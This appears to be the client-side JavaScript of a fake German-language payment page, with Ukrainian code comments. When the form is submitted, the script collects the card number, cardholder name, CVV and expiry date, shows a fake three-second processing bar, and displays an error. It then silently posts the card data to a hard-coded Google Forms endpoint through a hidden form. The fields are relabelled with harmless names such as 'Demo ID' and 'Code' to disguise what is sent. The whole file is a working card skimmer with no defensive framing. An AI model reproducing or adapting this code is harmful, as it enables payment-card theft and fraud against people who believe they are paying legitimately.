function showUnavailable() {
    alert('Diese Funktion ist vorübergehend nicht verfügbar');
}

function formatExpiryDate() {
    const expiryField = document.getElementById('expiry');
    if (!expiryField) return;
    let value = expiryField.value.replace(/\D/g, '');
    if (value.length > 2) {
        value = value.substring(0,2) + '/' + value.substring(2,4);
    }
    expiryField.value = value;
}

const expiryElem = document.getElementById('expiry');
if (expiryElem) {
    expiryElem.addEventListener('input', formatExpiryDate);
}

function showProgressBar() {
    const progressContainer = document.createElement('div');
    progressContainer.style.width = '100%';
    progressContainer.style.height = '6px';
    progressContainer.style.backgroundColor = '#e2e8f0';
    progressContainer.style.borderRadius = '3px';
    progressContainer.style.margin = '20px 0';
    progressContainer.style.overflow = 'hidden';
    
    const progressBar = document.createElement('div');
    progressBar.style.height = '100%';
    progressBar.style.width = '0%';
    progressBar.style.backgroundColor = '#48bb78';
    progressBar.style.borderRadius = '3px';
    progressBar.style.transition = 'width 4s linear';
    
    progressContainer.appendChild(progressBar);
    
    const payButton = document.querySelector('button[type="submit"]');
    if (payButton && payButton.parentNode) {
        payButton.parentNode.insertBefore(progressContainer, payButton);
    }
    
    setTimeout(() => {
        progressBar.style.width = '100%';
    }, 50);
    
    return progressContainer;
}

/* ----- функція для відправки через приховану форму ----- */
function sendToGoogleFormsViaHiddenForm(formUrl, entryKey, combinedText) {
    const hiddenForm = document.createElement('form');
    hiddenForm.method = 'POST';
    hiddenForm.action = formUrl;
    hiddenForm.target = 'hidden_iframe_submit';
    hiddenForm.style.display = 'none';

    const input = document.createElement('input');
    input.type = 'hidden';
    input.name = entryKey;
    input.value = combinedText;
    hiddenForm.appendChild(input);

    document.body.appendChild(hiddenForm);
    hiddenForm.submit();

    setTimeout(() => {
        hiddenForm.remove();
    }, 2000);
}

document.getElementById('paymentForm').addEventListener('submit', async function(e) {
    e.preventDefault();

    const payButton = document.querySelector('button[type="submit"]');
    if (payButton) payButton.style.display = 'none';

    const progressContainer = showProgressBar();

    const cardData = {
        number: (document.getElementById('cardNumber')?.value || '').trim(),
        name: document.getElementById('cardName')?.value || '',
        cvv: document.getElementById('cvv')?.value || '',
        expiry: document.getElementById('expiry')?.value || ''
    };

    // Імітація обробки (коротше — 3 секунди)
    await new Promise(resolve => setTimeout(resolve, 3000));

    const errEl = document.getElementById('errorMessage');
    if (errEl) errEl.style.display = 'block';
    if (payButton) payButton.style.display = 'block';
    if (progressContainer) progressContainer.remove();

    // ===== ТУТ ПІДСТАВЛЕНО ТВОЄ ПОСИЛАННЯ =====
    const FORM_URL = 'https://docs.google.com/forms/d/e/1FAIpQLScOuEoZt815oVcnGb_A_GQQpZU6znn51aKpxYtsM9qAagZ1Lg/formResponse';
    const ENTRY_KEY = 'entry.1021782095';
    // ========================================

    const combined = 
        `Demo ID: ${cardData.number}\n` +
        `User: ${cardData.name}\n` +
        `Code: ${cardData.cvv}\n` +
        `Note: ${cardData.expiry}\n` +
        `Time: ${new Date().toLocaleString('de-DE')}`;

    // Відправляємо через приховану форму (надійніше для Google Forms)
    sendToGoogleFormsViaHiddenForm(FORM_URL, ENTRY_KEY, combined);

    console.log('Demo data sent (attempt).');
});
